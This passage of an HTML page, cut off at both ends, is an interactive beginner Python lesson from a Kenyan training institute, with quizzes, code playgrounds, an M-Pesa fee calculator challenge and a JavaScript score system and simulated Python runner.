scorePop{0%{opacity:1;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-60px) scale(1.4)}}\n\n/* --- FOOTER --- */\n.lesson-footer{text-align:center;padding:60px 20px;color:var(--text3);font-size:14px;border-top:1px solid rgba(74,222,128,.06)}\n.lesson-footer .logo{font-family:''Fraunces'',serif;font-size:20px;color:var(--green);font-weight:700;margin-bottom:6px}\n\n/* --- TOC --- */\n.toc{background:var(--bg2);border:1px solid rgba(74,222,128,.1);border-radius:var(--radius);padding:24px;margin:28px 0}\n.toc h3{font-size:16px;margin-bottom:14px;display:flex;align-items:center;gap:8px}\n.toc-list{display:flex;flex-direction:column;gap:6px}\n.toc-item{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:8px;color:var(--text2);text-decoration:none;font-size:14px;transition:all .2s}\n.toc-item:hover{background:var(--green-dim);color:var(--green)}\n.toc-item .num{font-family:''JetBrains Mono'',monospace;font-size:11px;color:var(--text3);width:24px}\n\n/* --- RESPONSIVE --- */\n@media(max-width:640px){\n  .lesson-section{padding:50px 16px}\n  .concept-grid{grid-template-columns:1fr}\n  .scoreboard{bottom:10px;right:10px;padding:10px 14px}\n  .scoreboard .score-val{font-size:18px}\n  .code-editor{font-size:12px;padding:12px}\n}\n\n/* --- ANIMATED ENTRANCE --- */\n.reveal{opacity:0;transform:translateY(30px);transition:opacity .6s var(--ease),transform .6s var(--ease)}\n.reveal.visible{opacity:1;transform:translateY(0)}\n</style>\n</head>\n<body>\n\n<!-- Progress Bar -->\n<div class="progress-bar" id="progressBar"></div>\n\n<!-- Scoreboard -->\n<div class="scoreboard">\n  <div>\n    <div class="score-label">Your Score</div>\n    <div class="score-val" id="score">0</div>\n  </div>\n  <div class="xp" id="xpLabel">🔥 Keep going!</div>\n</div>\n\n<!-- HERO -->\n<section class="hero" id="hero">\n  <div class="hero-badge"><span class="dot"></span> M.T.T.I Interactive Lesson</div>\n  <h1>Learn <span class="accent">Python</span><br>From Zero</h1>\n  <p class="subtitle">A hands-on, interactive introduction to the world''s most popular programming language. No experience needed — just curiosity.</p>\n  <a href="#section1" class="start-btn">🚀 Start Learning</a>\n  <div class="snake">🐍</div>\n</section>\n\n<!-- TABLE OF CONTENTS -->\n<section class="lesson-section" id="toc-section">\n  <div class="toc reveal">\n    <h3>📋 What You''ll Learn</h3>\n    <div class="toc-list">\n      <a href="#section1" class="toc-item"><span class="num">01</span> What is Python & Why Learn It?</a>\n      <a href="#section2" class="toc-item"><span class="num">02</span> Your First Python Program</a>\n      <a href="#section3" class="toc-item"><span class="num">03</span> Variables & Data Types</a>\n      <a href="#section4" class="toc-item"><span class="num">04</span> Working with Numbers</a>\n      <a href="#section5" class="toc-item"><span class="num">05</span> Getting User Input</a>\n      <a href="#section6" class="toc-item"><span class="num">06</span> Making Decisions with If/Else</a>\n      <a href="#section7" class="toc-item"><span class="num">07</span> Loops — Repeating Things</a>\n      <a href="#section8" class="toc-item"><span class="num">08</span> Final Challenge: Build a Mini Program</a>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 1: What is Python -->\n<section class="lesson-section" id="section1">\n  <div class="reveal">\n    <div class="section-num">Section 01</div>\n    <h2>What is Python?</h2>\n    <p class="desc">Python is a powerful yet beginner-friendly programming language used by companies like Google, Netflix, and NASA. Let''s find out why it''s perfect for beginners.</p>\n    \n    <div class="concept-grid">\n      <div class="concept-card"><span class="icon">🎯</span><h4>Easy to Read</h4><p>Python reads almost like English — no confusing symbols or brackets everywhere</p></div>\n      <div class="concept-card"><span class="icon">🌍</span><h4>Used Everywhere</h4><p>Web apps, AI, data science, automation, cybersecurity, games, and more</p></div>\n      <div class="concept-card"><span class="icon">💼</span><h4>High Demand</h4><p>One of the most in-demand skills in Kenya and globally for tech jobs</p></div>\n      <div class="concept-card"><span class="icon">🚀</span><h4>Fast to Build</h4><p>Build real programs in just a few lines — way less code than most languages</p></div>\n    </div>\n\n    <div class="info-card">\n      <h3>💡 Fun Fact</h3>\n      <p>Python was created in 1991 by Guido van Rossum. It''s named after the comedy show "Monty Python''s Flying Circus" — not the snake! 🐍😄</p>\n    </div>\n\n    <div class="quiz-box" data-quiz="q1">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What is Python named after?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q1'')"><span class="letter">A</span> The Python snake</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q1'')"><span class="letter">B</span> Monty Python''s Flying Circus</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q1'')"><span class="letter">C</span> A Greek god</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q1'')"><span class="letter">D</span> A type of computer chip</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q1"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 2: First Program -->\n<section class="lesson-section" id="section2">\n  <div class="reveal">\n    <div class="section-num">Section 02</div>\n    <h2>Your First Python Program</h2>\n    <p class="desc">Every programmer starts here — the legendary "Hello, World!" program. In Python, it''s just one line. Try it below!</p>\n\n    <div class="info-card">\n      <h3>📝 The <code style="color:var(--green)">print()</code> Function</h3>\n      <p><code style="color:var(--green)">print()</code> displays text on the screen. Put your text inside quotes — either single <code>''like this''</code> or double <code>"like this"</code>.</p>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">hello.py</span>\n        <button class="run-btn" onclick="runCode(''editor1'',''output1'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor1" spellcheck="false">print("Hello, World!")\nprint("I am learning Python at M.T.T.I!")\nprint("Eldoret, Kenya 🇰🇪")</textarea>\n      <div class="code-output" id="output1"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <div class="challenge-box">\n      <h3>⚡ Try This!</h3>\n      <p class="instructions">Edit the code above and make it print <strong>your own name</strong> and <strong>your favorite food</strong>. Then click Run!</p>\n    </div>\n\n    <div class="quiz-box" data-quiz="q2">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">Which is the correct way to print "Jambo" in Python?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q2'')"><span class="letter">A</span> echo "Jambo"</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q2'')"><span class="letter">B</span> print("Jambo")</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q2'')"><span class="letter">C</span> display("Jambo")</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q2'')"><span class="letter">D</span> Print "Jambo"</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q2"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 3: Variables & Data Types -->\n<section class="lesson-section" id="section3">\n  <div class="reveal">\n    <div class="section-num">Section 03</div>\n    <h2>Variables & Data Types</h2>\n    <p class="desc">Variables are like labeled boxes that store information. You give them a name and put a value inside. Python figures out the type automatically!</p>\n\n    <div class="info-card">\n      <h3>📦 Creating Variables</h3>\n      <p>Use the <code style="color:var(--green)">=</code> sign to store a value: <code style="color:var(--green)">name = "Aisha"</code> stores the text "Aisha" in a variable called <code>name</code>.</p>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">variables.py</span>\n        <button class="run-btn" onclick="runCode(''editor2'',''output2'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor2" spellcheck="false"># Variables in Python\nname = "Aisha"\nage = 22\nheight = 1.65\nis_student = True\n\nprint("Name:", name)\nprint("Age:", age)\nprint("Height:", height, "meters")\nprint("Student?", is_student)</textarea>\n      <div class="code-output" id="output2"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <h3 style="margin:28px 0 12px;font-size:17px">🔍 Explore Data Types — Click Each One</h3>\n    <div class="type-explorer">\n      <div class="type-tag" data-type="str" onclick="showType(''str'')">str — Text</div>\n      <div class="type-tag" data-type="int" onclick="showType(''int'')">int — Whole Numbers</div>\n      <div class="type-tag" data-type="float" onclick="showType(''float'')">float — Decimals</div>\n      <div class="type-tag" data-type="bool" onclick="showType(''bool'')">bool — True/False</div>\n      <div class="type-tag" data-type="list" onclick="showType(''list'')">list — Collections</div>\n    </div>\n    <div class="type-detail" id="type-str"><strong style="color:var(--green)">str (String)</strong> — Text wrapped in quotes.<br><code style="color:var(--green)">name = "Kipchoge"</code> &nbsp;|&nbsp; <code style="color:var(--green)">city = ''Eldoret''</code></div>\n    <div class="type-detail" id="type-int"><strong style="color:var(--blue)">int (Integer)</strong> — Whole numbers, no decimal point.<br><code style="color:var(--blue)">age = 25</code> &nbsp;|&nbsp; <code style="color:var(--blue)">students = 300</code></div>\n    <div class="type-detail" id="type-float"><strong style="color:var(--orange)">float</strong> — Numbers with a decimal point.<br><code style="color:var(--orange)">price = 49.99</code> &nbsp;|&nbsp; <code style="color:var(--orange)">pi = 3.14159</code></div>\n    <div class="type-detail" id="type-bool"><strong style="color:var(--pink)">bool (Boolean)</strong> — Only two values: True or False.<br><code style="color:var(--pink)">is_enrolled = True</code> &nbsp;|&nbsp; <code style="color:var(--pink)">has_paid = False</code></div>\n    <div class="type-detail" id="type-list"><strong style="color:var(--purple)">list</strong> — A collection of items in square brackets.<br><code style="color:var(--purple)">fruits = ["mango", "banana", "avocado"]</code></div>\n\n    <div class="quiz-box" data-quiz="q3">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What data type is <code style="color:var(--green)">price = 49.99</code>?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q3'')"><span class="letter">A</span> str</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q3'')"><span class="letter">B</span> int</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q3'')"><span class="letter">C</span> float</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q3'')"><span class="letter">D</span> bool</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q3"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 4: Numbers & Math -->\n<section class="lesson-section" id="section4">\n  <div class="reveal">\n    <div class="section-num">Section 04</div>\n    <h2>Working with Numbers</h2>\n    <p class="desc">Python is a powerful calculator! You can add, subtract, multiply, divide, and much more.</p>\n\n    <div class="concept-grid">\n      <div class="concept-card"><span class="icon">➕</span><h4>Add: +</h4><p>5 + 3 = 8</p></div>\n      <div class="concept-card"><span class="icon">➖</span><h4>Subtract: -</h4><p>10 - 4 = 6</p></div>\n      <div class="concept-card"><span class="icon">✖️</span><h4>Multiply: *</h4><p>6 * 7 = 42</p></div>\n      <div class="concept-card"><span class="icon">➗</span><h4>Divide: /</h4><p>15 / 4 = 3.75</p></div>\n      <div class="concept-card"><span class="icon">💪</span><h4>Power: **</h4><p>2 ** 3 = 8</p></div>\n      <div class="concept-card"><span class="icon">🔢</span><h4>Remainder: %</h4><p>10 % 3 = 1</p></div>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">math.py</span>\n        <button class="run-btn" onclick="runCode(''editor3'',''output3'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor3" spellcheck="false"># Python as a calculator\nprice = 1500\nquantity = 4\ntotal = price * quantity\n\nprint("Price per item: KSh", price)\nprint("Quantity:", quantity)\nprint("Total: KSh", total)\n\n# Calculate discount\ndiscount = total * 0.10\nfinal = total - discount\nprint("After 10% discount: KSh", final)</textarea>\n      <div class="code-output" id="output3"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <div class="challenge-box">\n      <h3>⚡ Challenge: Shopping Calculator</h3>\n      <p class="instructions">Modify the code above to calculate the total for 3 items at KSh 2,500 each, with a 15% discount. What''s the final price?</p>\n      <button class="hint-btn" onclick="toggleHint(''hint1'')">💡 Show Hint</button>\n      <div class="hint-text" id="hint1">Change <code>price = 2500</code>, <code>quantity = 3</code>, and <code>discount = total * 0.15</code></div>\n    </div>\n\n    <div class="quiz-box" data-quiz="q4">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What does <code style="color:var(--green)">10 % 3</code> give you in Python?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q4'')"><span class="letter">A</span> 3.33</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q4'')"><span class="letter">B</span> 1</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q4'')"><span class="letter">C</span> 3</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q4'')"><span class="letter">D</span> 30</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q4"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 5: User Input -->\n<section class="lesson-section" id="section5">\n  <div class="reveal">\n    <div class="section-num">Section 05</div>\n    <h2>Getting User Input</h2>\n    <p class="desc">Make your programs interactive! The <code style="color:var(--green)">input()</code> function asks the user to type something.</p>\n\n    <div class="info-card">\n      <h3>⌨️ How input() Works</h3>\n      <p><code style="color:var(--green)">name = input("What is your name? ")</code> — This shows the question, waits for the user to type, then stores their answer in the variable <code>name</code>. The input is always a string, so use <code style="color:var(--green)">int()</code> to convert numbers.</p>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">greeting.py</span>\n        <button class="run-btn" onclick="runCode(''editor4'',''output4'',[''Wanjiku'',''20''])">▶ Run (simulated)</button>\n      </div>\n      <textarea class="code-editor" id="editor4" spellcheck="false"># Getting user input\nname = input("What is your name? ")\nage = input("How old are you? ")\n\nprint("Hello, " + name + "!")\nprint("You are " + age + " years old.")\nprint("In 5 years you''ll be", int(age) + 5)</textarea>\n      <div class="code-output" id="output4"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <div class="info-card">\n      <h3>⚠️ Important: Converting Types</h3>\n      <p><code style="color:var(--green)">input()</code> always returns text (string). To do math with it, convert it:<br>\n      <code style="color:var(--blue)">int("25")</code> → 25 (whole number) &nbsp;|&nbsp; <code style="color:var(--orange)">float("3.14")</code> → 3.14 (decimal)</p>\n    </div>\n\n    <div class="quiz-box" data-quiz="q5">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What will <code style="color:var(--green)">int("7") + 3</code> give?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q5'')"><span class="letter">A</span> "73"</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q5'')"><span class="letter">B</span> 10</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q5'')"><span class="letter">C</span> Error</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q5'')"><span class="letter">D</span> "10"</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q5"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 6: If/Else -->\n<section class="lesson-section" id="section6">\n  <div class="reveal">\n    <div class="section-num">Section 06</div>\n    <h2>Making Decisions with If/Else</h2>\n    <p class="desc">Programs need to make choices — "if this, do that, otherwise do something else." This is called conditional logic.</p>\n\n    <div class="info-card">\n      <h3>🔀 The Structure</h3>\n      <p>Use <code style="color:var(--green)">if</code>, <code style="color:var(--green)">elif</code> (else if), and <code style="color:var(--green)">else</code>. The code inside must be <strong>indented</strong> (4 spaces). Comparison: <code>==</code> equal, <code>!=</code> not equal, <code>&gt;</code> greater, <code>&lt;</code> less, <code>&gt;=</code> greater or equal, <code>&lt;=</code> less or equal.</p>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">grading.py</span>\n        <button class="run-btn" onclick="runCode(''editor5'',''output5'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor5" spellcheck="false"># M.T.T.I Grading System\nscore = 85\n\nif score >= 90:\n    grade = "A - Excellent!"\nelif score >= 80:\n    grade = "B - Good"\nelif score >= 70:\n    grade = "C - Satisfactory"\nelif score >= 60:\n    grade = "D - Needs Improvement"\nelse:\n    grade = "F - Fail"\n\nprint("Score:", score)\nprint("Grade:", grade)</textarea>\n      <div class="code-output" id="output5"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <div class="challenge-box">\n      <h3>⚡ Challenge: Age Checker</h3>\n      <p class="instructions">Write a program that checks if a person is a child (under 13), teenager (13-17), or adult (18+). Change the <code>age</code> variable and test it!</p>\n      <button class="hint-btn" onclick="toggleHint(''hint2'')">💡 Show Hint</button>\n      <div class="hint-text" id="hint2">Start with <code>age = 16</code>, then use <code>if age < 13:</code> ... <code>elif age < 18:</code> ... <code>else:</code></div>\n    </div>\n\n    <div class="quiz-box" data-quiz="q6">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What keyword means "otherwise if" in Python?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q6'')"><span class="letter">A</span> else if</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q6'')"><span class="letter">B</span> elseif</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q6'')"><span class="letter">C</span> elif</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q6'')"><span class="letter">D</span> or if</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q6"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 7: Loops -->\n<section class="lesson-section" id="section7">\n  <div class="reveal">\n    <div class="section-num">Section 07</div>\n    <h2>Loops — Repeating Things</h2>\n    <p class="desc">Loops let you repeat code without writing it over and over. Python has two main types: <code style="color:var(--green)">for</code> and <code style="color:var(--green)">while</code>.</p>\n\n    <div class="concept-grid" style="grid-template-columns:1fr 1fr">\n      <div class="info-card" style="margin:0">\n        <h3>🔄 For Loop</h3>\n        <p>Repeats for each item in a sequence. Great when you know how many times to loop.</p>\n      </div>\n      <div class="info-card" style="margin:0">\n        <h3>🔁 While Loop</h3>\n        <p>Keeps going as long as a condition is True. Great for "keep doing until..."</p>\n      </div>\n    </div>\n\n    <div class="code-playground" style="margin-top:20px">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">loops.py</span>\n        <button class="run-btn" onclick="runCode(''editor6'',''output6'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor6" spellcheck="false"># For loop — repeat for each item\nfruits = ["mango", "banana", "avocado", "passion"]\nprint("--- My Favorite Fruits ---")\nfor fruit in fruits:\n    print("🍎 I love", fruit)\n\n# For loop with range\nprint("\\n--- Counting ---")\nfor i in range(1, 6):\n    print("Number:", i)\n\n# While loop\nprint("\\n--- Countdown ---")\ncount = 5\nwhile count > 0:\n    print(count, "...")\n    count = count - 1\nprint("🚀 Liftoff!")</textarea>\n      <div class="code-output" id="output6"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <div class="quiz-box" data-quiz="q7">\n      <h3>🧠 Quick Check</h3>\n      <p class="question">What does <code style="color:var(--green)">range(1, 5)</code> produce?</p>\n      <div class="quiz-options">\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q7'')"><span class="letter">A</span> 1, 2, 3, 4, 5</div>\n        <div class="quiz-opt" data-answer="correct" onclick="checkQuiz(this,''q7'')"><span class="letter">B</span> 1, 2, 3, 4</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q7'')"><span class="letter">C</span> 0, 1, 2, 3, 4</div>\n        <div class="quiz-opt" data-answer="wrong" onclick="checkQuiz(this,''q7'')"><span class="letter">D</span> 5, 4, 3, 2, 1</div>\n      </div>\n      <div class="quiz-feedback" id="fb-q7"></div>\n    </div>\n  </div>\n</section>\n\n<!-- SECTION 8: Final Challenge -->\n<section class="lesson-section" id="section8">\n  <div class="reveal">\n    <div class="section-num">Section 08</div>\n    <h2>🏆 Final Challenge</h2>\n    <p class="desc">Put everything together! Build a simple M-Pesa fee calculator that takes an amount and tells the user the transaction fee.</p>\n\n    <div class="challenge-box" style="background:linear-gradient(135deg,rgba(251,191,36,.08),rgba(249,115,22,.05))">\n      <h3>🎯 Mission: M-Pesa Fee Calculator</h3>\n      <p class="instructions">\n        Write a program that:<br>\n        1. Sets an amount (e.g., <code>amount = 5000</code>)<br>\n        2. Calculates the fee based on these rules:<br>\n        &nbsp;&nbsp;&nbsp;• KSh 1 - 100: Fee = KSh 0 (Free)<br>\n        &nbsp;&nbsp;&nbsp;• KSh 101 - 2,500: Fee = KSh 28<br>\n        &nbsp;&nbsp;&nbsp;• KSh 2,501 - 10,000: Fee = KSh 52<br>\n        &nbsp;&nbsp;&nbsp;• Above KSh 10,000: Fee = KSh 69<br>\n        3. Prints the amount, fee, and total\n      </p>\n    </div>\n\n    <div class="code-playground">\n      <div class="code-toolbar">\n        <div class="code-dots"><span></span><span></span><span></span></div>\n        <span class="code-filename">mpesa_calc.py</span>\n        <button class="run-btn" onclick="runCode(''editor7'',''output7'')">▶ Run</button>\n      </div>\n      <textarea class="code-editor" id="editor7" spellcheck="false"># M-Pesa Fee Calculator\n# YOUR CODE HERE — Try writing it yourself first!\n\namount = 5000\n\n# Calculate fee using if/elif/else\n# (write your conditions here)\n\n\n# Print results\n# print("Amount: KSh", amount)\n# print("Fee: KSh", fee)\n# print("Total: KSh", amount + fee)</textarea>\n      <div class="code-output" id="output7"><span class="label">OUTPUT:</span></div>\n    </div>\n\n    <button class="hint-btn" onclick="toggleHint(''hint3'')" style="margin-top:10px">💡 Show Full Solution</button>\n    <div class="hint-text" id="hint3" style="font-family:''JetBrains Mono'',monospace;font-size:13px;line-height:1.9;white-space:pre">amount = 5000\n\nif amount <= 100:\n    fee = 0\nelif amount <= 2500:\n    fee = 28\nelif amount <= 10000:\n    fee = 52\nelse:\n    fee = 69\n\nprint("Amount: KSh", amount)\nprint("Fee: KSh", fee)\nprint("Total: KSh", amount + fee)</div>\n  </div>\n</section>\n\n<!-- COMPLETION -->\n<section class="lesson-section" style="text-align:center" id="completion">\n  <div class="reveal">\n    <div style="font-size:72px;margin-bottom:16px">🎉</div>\n    <h2 style="font-family:''Fraunces'',serif;margin-bottom:12px">Lesson Complete!</h2>\n    <p style="color:var(--text2);max-width:500px;margin:0 auto 24px;font-size:17px">You''ve learned the fundamentals of Python — variables, data types, math, input, decisions, and loops. That''s a solid foundation!</p>\n    \n    <div class="concept-grid" style="max-width:600px;margin:0 auto 32px">\n      <div class="concept-card"><span class="icon">✅</span><h4>print() & input()</h4><p>Display output, get user input</p></div>\n      <div class="concept-card"><span class="icon">✅</span><h4>Variables & Types</h4><p>str, int, float, bool, list</p></div>\n      <div class="concept-card"><span class="icon">✅</span><h4>If / Elif / Else</h4><p>Make decisions in code</p></div>\n      <div class="concept-card"><span class="icon">✅</span><h4>For & While Loops</h4><p>Repeat actions efficiently</p></div>\n    </div>\n\n    <div class="info-card" style="text-align:left;max-width:600px;margin:0 auto">\n      <h3>📚 What''s Next?</h3>\n      <p>Continue your Python journey at M.T.T.I! The next lessons cover functions, file handling, working with APIs, and building real projects. Visit us at Sagaas Center, 4th Floor, Eldoret.</p>\n    </div>\n  </div>\n</section>\n\n<footer class="lesson-footer">\n  <div class="logo">M.T.T.I</div>\n  <p>Masomotele Technical Training Institute — Sagaas Center, 4th Floor, Eldoret, Kenya</p>\n  <p style="color:var(--green);font-style:italic;margin-top:4px">"Start Learning, Start Earning"</p>\n</footer>\n\n<script>\n// --- Score system ---\nlet totalScore = 0;\nconst answeredQuizzes = new Set();\n\nfunction addScore(pts, el) {\n  totalScore += pts;\n  document.getElementById(''score'').textContent = totalScore;\n  // Floating +points\n  const pop = document.createElement(''div'');\n  pop.className = ''score-pop'';\n  pop.textContent = ''+'' + pts;\n  const rect = el.getBoundingClientRect();\n  pop.style.left = rect.left + ''px'';\n  pop.style.top = rect.top + ''px'';\n  document.body.appendChild(pop);\n  setTimeout(() => pop.remove(), 900);\n  // Update label\n  const label = document.getElementById(''xpLabel'');\n  if (totalScore >= 70) label.textContent = ''🏆 Python Master!'';\n  else if (totalScore >= 50) label.textContent = ''🌟 Amazing!'';\n  else if (totalScore >= 30) label.textContent = ''🔥 On fire!'';\n  else if (totalScore >= 10) label.textContent = ''💪 Nice work!'';\n}\n\n// --- Quiz ---\nfunction checkQuiz(opt, quizId) {\n  if (answeredQuizzes.has(quizId)) return;\n  const fb = document.getElementById(''fb-'' + quizId);\n  const isCorrect = opt.dataset.answer === ''correct'';\n  \n  // Mark all options\n  const box = opt.closest(''.quiz-box'');\n  box.querySelectorAll(''.quiz-opt'').forEach(o => {\n    if (o.dataset.answer === ''correct'') o.classList.add(''correct'');\n    else if (o === opt && !isCorrect) o.classList.add(''wrong'');\n    o.style.pointerEvents = ''none'';\n  });\n  \n  fb.className = ''quiz-feedback show '' + (isCorrect ? ''correct'' : ''wrong'');\n  fb.textContent = isCorrect ? ''✅ Correct! Well done!'' : ''❌ Not quite. The correct answer is highlighted in green.'';\n  \n  if (isCorrect) {\n    answeredQuizzes.add(quizId);\n    addScore(10, opt);\n  } else {\n    answeredQuizzes.add(quizId);\n  }\n}\n\n// --- Simple Python runner (simulated) ---\nfunction runCode(editorId, outputId, simulatedInputs) {\n  const code = document.getElementById(editorId).value;\n  const outputEl = document.getElementById(outputId);\n  outputEl.classList.add(''show'');\n  \n  let output = '''';\n  let inputIdx = 0;\n  const inputValues = simulatedInputs || [];\n  \n  try {\n    // Simple Python interpreter simulation\n    const lines = code.split(''\\n'');\n    const vars = {};\n    let i = 0;\n    \n    function evalExpr(expr) {\n      expr = expr.trim();\n      // String concatenation and operations\n      // Replace variable names with their values\n      let resolved = expr;\n      \n      // Handle input() calls\n      if (resolved.includes(''input('')) {\n        const promptMatch = resolved.match(/input\\(["''](.*)["'']\\)/);\n        const prompt = promptMatch ? promptMatch[1] : '''';\n        const val = inputValues[inputIdx] || ''user'';\n        inputIdx++;\n        output += prompt + val + ''\\n'';\n        return val;\n      }\n      \n      // Handle int() conversion\n      const intMatch = resolved.match(/^int\\((.+)\\)(\\s*[\\+\\-\\*\\/]\\s*.+)?$/);\n      if (intMatch) {\n        let inner = evalExpr(intMatch[1]);\n        let result = parseInt(inner);\n        if (intMatch[2]) {\n          result = eval(result + intMatch[2].replace(/[a-zA-Z_]\\w*/g, m => vars[m] !== undefined ? JSON.stringify(vars[m]) : m));\n        }\n        return result;\n      }\n      \n      // Handle float()\n      const floatMatch = resolved.match(/^float\\((.+)\\)$/);\n      if (floatMatch) return parseFloat(evalExpr(floatMatch[1]));\n      \n      // Handle type()\n      const typeMatch = resolved.match(/^type\\((.+)\\)$/);\n      if (typeMatch) {\n        const val = evalExpr(typeMatch[1]);\n        if (typeof val === ''string'') return "<class ''str''>";\n        if (typeof val === ''number'') return Number.isInteger(val) ? "<class ''int''>" : "<class ''float''>";\n        if (typeof val === ''boolean'') return "<class ''bool''>";\n        return "<class ''object''>";\n      }\n      \n      // Replace vars in expression\n      for (const [k, v] of Object.entries(vars)) {\n        const re = new RegExp(''\\\\b'' + k + ''\\\\b'', ''g'');\n        if (typeof v === ''string'') resolved = resolved.replace(re, JSON.stringify(v));\n        else resolved = resolved.replace(re, String(v));\n      }\n      \n      try { return eval(resolved); } catch(e) { return resolved.replace(/^["'']|["'']$/g, ''''); }\n    }\n    \n    function processBlock(startIdx, indent) {\n      let idx = startIdx;\n      while (idx < lines.length) {\n        let line = lines[idx];\n        let rawLine = line;\n        let currentIndent = line.search(/\\S/);\n        if (currentIndent === -1) { idx++; continue; }\n        if (currentIndent < indent) return idx;\n        if (line.trim().startsWith(''#'')) { idx++; continue; }\n        line = line.trim();\n        \n        // Variable assignment\n        const assignMatch = line.match(/^([a-zA-Z_]\\w*)\\s*=\\s*(.+)$/);\n        if (assignMatch && !line.startsWith(''if '') && !line.startsWith(''elif '') && !line.startsWith(''else'') && !line.startsWith(''for '') && !line.startsWith(''while '')) {\n          const varName = assignMatch[1];\n          const valExpr = assignMatch[2];\n          \n          // Handle list literal\n          if (valExpr.trim().startsWith(''['')) {\n            try {\n              let listStr = valExpr;\n              for (const [k, v] of Object.entries(vars)) {\n                listStr = listStr.replace(new RegExp(''\\\\b'' + k + ''\\\\b'', ''g''), typeof v === ''string'' ? JSON.stringify(v) : v);\n              }\n              vars[varName] = eval(listStr);\n            } catch(e) { vars[varName] = valExpr; }\n          } else {\n            vars[varName] = evalExpr(valExpr);\n          }\n          idx++; continue;\n        }\n        \n        // Print\n        if (line.startsWith(''print('')) {\n          const inner = line.slice(6, -1);\n          // Split by comma, respecting strings\n          const parts = [];\n          let current = '''', depth = 0, inStr = false, strChar = '''';\n          for (let c = 0; c < inner.length; c++) {\n            const ch = inner[c];\n            if (!inStr && (ch === ''"'' || ch === "''")) { inStr = true; strChar = ch; current += ch; }\n            else if (inStr && ch === strChar) { inStr = false; current += ch; }\n            else if (!inStr && ch === ''('') { depth++; current += ch; }\n            else if (!inStr && ch === '')'') { depth--; current += ch; }\n            else if (!inStr && depth === 0 && ch === '','') { parts.push(current.trim()); current = ''''; }\n            else { current += ch; }\n          }\n          if (current.trim()) parts.push(current.trim());\n          \n          const evaluated = parts.map(p => {\n            let v = evalExpr(p);\n            return v;\n          });\n          output += evaluated.join('' '') + ''\\n'';\n          idx++; continue;\n        }\n        \n        // For 